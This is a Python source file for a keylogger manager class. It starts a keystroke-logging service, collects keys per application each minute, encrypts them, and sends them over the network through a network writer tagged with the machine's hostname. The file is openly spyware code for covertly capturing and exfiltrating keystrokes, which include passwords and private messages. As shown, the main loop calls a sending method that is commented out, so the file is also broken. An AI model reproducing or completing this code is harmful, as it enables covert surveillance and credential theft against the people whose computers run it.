from datetime import datetime
import socket
import time
from key_logger_service import KeyLoggerService
from encryptor import Encryptor
from network_writer import NetworkWriter


class KeyLoggerManager:
    def __init__(self):
        self.key_logger = KeyLoggerService()
        self.encryptor = Encryptor()
        self.network_writer = NetworkWriter()
        self.recent_key_logs = {}
        #self.all_logged_keys = {}  # בשביל טסט
        self.encrypted_logs = ""  # בשביל טסט
        #self.encrypted_total_logs = ""# בשביל טסט
        self.last_sent_minute = None

    def run_logger_loop(self):
        self.key_logger.start_logging()

        try:
            while True:
                current_time = datetime.now().strftime("%Y-%m-%d %H_%M")

                if (self.last_sent_minute == None or current_time != self.last_sent_minute  ):
                    self.last_sent_minute = current_time
                    self.recent_key_logs = self.get_recently_logged_keys()
                    self.encrypted_logs = self.encrypt_logged_keys(self.recent_key_logs)
                    self.send_logged_keys(self.encrypted_logs)

                    #self.update_total_logs()
                    # self.encrypted_total_logs = self.encrypt_logged_keys(self.all_logged_keys)
                    # #self.display_logged_keys()

                time.sleep(1)

        except KeyboardInterrupt:
            print("\nStopping key logger...")
            self.key_logger.stop_logging()

    def get_recently_logged_keys(self):
        return self.key_logger.get_logged_keys()

    def encrypt_logged_keys(self, logs):
        return self.encryptor.encrypt(str(logs))

   #
   #  def update_total_logs(self):
   #      for timestamp, apps in self.recent_key_logs.items():
   #          if timestamp not in self.all_logged_keys:
   #              self.all_logged_keys[timestamp] = {}
   #
   #          for app, keys in apps.items():
   #              if app in self.all_logged_keys[timestamp]:
   #                  self.all_logged_keys[timestamp][app] += keys
   #              else:
   #                  self.all_logged_keys[timestamp][app] = keys
   #
   #
   #  def send_logged_keys(self, encrypted_data):
   #      machine_name = socket.gethostname()
   #      payload = {self.last_sent_minute : encrypted_data}  # משתמשים במפתח ה"first_key" לשליחה
   #      self.network_writer.send_data(payload, machine_name)
   #
   #  def display_logged_keys(self):
   #      print("\n=== Recently Logged Keys (Last 10 Seconds) ===")
   #      if self.recent_key_logs:
   #          for timestamp, apps in self.recent_key_logs.items():
   #              print(f"{timestamp}:")
   #              for app, keys in apps.items():
   #                  print(f"  - {app}: {keys}")
   #      else:
   #          print("No keys logged in the last 10 seconds.")
   #
   #      print("\n=== Total Logged Keys (Since Start) ===")
   #      if self.all_logged_keys:
   #          for timestamp, apps in self.all_logged_keys.items():
   #              print(f"{timestamp}:")
   #              for app, keys in apps.items():
   #                  print(f"  - {app}: {keys}")
   #      else:
   #          print("No keys logged since the start.")
   #
   #      print("\n=== Encrypted Logged Keys (Last 10 Seconds) ===")
   #      print(self.encrypted_logs if self.encrypted_logs else "No encrypted data available.")
   #
   #      print("\n=== Encrypted Total Logged Keys (Since Start) ===")
   #      print(self.encrypted_total_logs if self.encrypted_total_logs else "No total encrypted data available.")
   #
   #      print("\n🔓=== Decrypted Logged Keys (Last 10 Seconds) ===")
   #      decrypted_logs = self.decrypt_logged_keys(self.encrypted_logs) if self.encrypted_logs else "No data to decrypt."
   #      print(decrypted_logs)
   #
   #      print("\n🔓=== Decrypted Total Logged Keys (Since Start) ===")
   #      decrypted_total_logs = self.decrypt_logged_keys(
   #          self.encrypted_total_logs) if self.encrypted_total_logs else "No data to decrypt."
   #      print(decrypted_total_logs)
